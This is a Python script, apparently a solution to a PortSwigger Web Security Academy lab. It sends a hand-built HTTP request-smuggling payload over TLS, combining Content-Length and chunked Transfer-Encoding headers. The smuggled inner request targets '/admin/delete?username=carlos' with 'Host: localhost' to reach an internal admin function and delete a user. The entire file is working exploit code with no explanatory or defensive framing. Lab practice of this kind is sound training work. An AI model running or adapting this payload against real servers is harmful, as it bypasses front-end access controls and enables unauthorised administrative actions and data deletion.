import socket
import ssl

host = '0ac7004a040e0ca682bafb6600ec00eb.web-security-academy.net'
port = 443

payload = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 140\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /admin/delete?username=carlos HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 4\r\n"
    "\r\n"
    "x=\r\n"
)

# body = (
#     "0\r\n"
#     "\r\n"
#     "GET /admin/delete?username=carlos HTTP/1.1\r\n"
#     "Host: localhost\r\n"
#     "Content-Type: application/x-www-form-urlencoded\r\n"
#     "Content-Length: 4\r\n"
#     "\r\n"
#     "x=\r\n"
# )
# print(len(body)) #140

# print(len("x=\r\n"))  #4

def send_raw_https(host, port, raw_payload):
    context = ssl.create_default_context()
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.sendall(raw_payload.encode())
            response = ssock.recv(4096)
            print(response.decode(errors="ignore"))

print("[+] Sending smuggling payload...")
send_raw_https(host, port, payload)